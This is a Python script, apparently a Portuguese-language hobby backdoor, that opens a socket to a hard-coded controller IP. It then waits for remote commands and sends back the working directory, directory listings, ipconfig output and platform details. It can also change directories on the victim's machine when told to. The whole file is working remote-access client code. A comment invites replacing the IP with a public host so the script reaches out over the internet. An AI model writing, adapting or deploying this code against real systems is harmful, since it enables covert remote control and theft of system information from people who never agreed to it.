
import socket
import os, base64
import sys

IP = "192.168.100.9" #se caso for público coloca seu host/dns
PORT = 2

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP, PORT))
print("Conectado!")

while True:
    command = s.recv(3000)
    command = command.decode()
    print(command)

    if command == "pwd":
        try:
            file = os.getcwd()
            file = str(file)
            file = file.encode()
            s.send(file)
        except:
            print("error!")
    
    elif command == "dir":
        try:
            dirx40ha = os.popen('dir')
            filedtrue = dirx40ha.read()
            filedtrue = str(filedtrue)
            filedtrue = filedtrue.encode()
            s.send(filedtrue)
        except:
            print("Não foi possivel listar os arquivos")

    elif command == "ipconfig":
        ipconflead = os.popen('ipconfig')
        ipconf40x = ipconflead.read()
        ipconf40x = str(ipconf40x)
        ipconf40x = ipconf40x.encode()
        s.send(ipconf40x)

    elif command == "cd ..":
        local = ".."
        file = os.chdir(local)
        print("")

    elif command == "info":
        import platform
        info = platform.uname()
        info = str(info)
        info = info.encode()
        s.send(info)

    elif command == "cd":
        try:
            print("")
            local = s.recv(50000)
            local = local.decode()
            file = os.getcwd()
            junto = file+'\\'+local
            path = os.chdir(junto)
        except:
            print("Error!")

    elif command == "dirchange":
        try:
            file = s.recv(40000)
            file = file.decode()
            print("local recebido",file)
            os.chdir(file)
            print("Local Trocado com Sucesso!")
        except:
            print("error")

    else:
        print("")
        print("Comando Error, Tente Novamente!")
        print("")